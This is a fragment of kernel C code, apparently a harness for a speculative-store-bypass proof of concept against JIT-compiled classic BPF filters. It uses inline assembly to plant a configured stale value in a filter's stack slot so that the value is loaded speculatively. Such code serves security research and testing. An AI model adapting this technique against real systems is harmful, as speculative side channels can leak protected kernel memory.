	...
	bpf_func_t bpf_func)
{
	 ...
	 * at the point of the asm relative to the enclosing call site.  The
	 * configurable POC offset uses M[k]'s base word at -20 - 4*k.
	 * Generated by: GPT-5. */
	/* Inject the configured 32-bit stale word into the configured cBPF M[k]
	 * slot (movl writes all four bytes of the slot, so bits 0..31 are
	 * available).  The store is architectural; the JIT'd filter then stores 0
	 * to the same slot and speculatively loads the stale word via SSB. */
	{
		extern u32 cbpf_poc_m0_stale;
		extern u32 cbpf_poc_stale_value;
		extern s16 cbpf_poc_stale_stack_off;
		u32 _v = READ_ONCE(cbpf_poc_stale_value);
		long _o = READ_ONCE(cbpf_poc_stale_stack_off);
		asm volatile("movl %0,(%%rsp,%1,1)" :: "r"(_v), "r"(_o) : "memory");
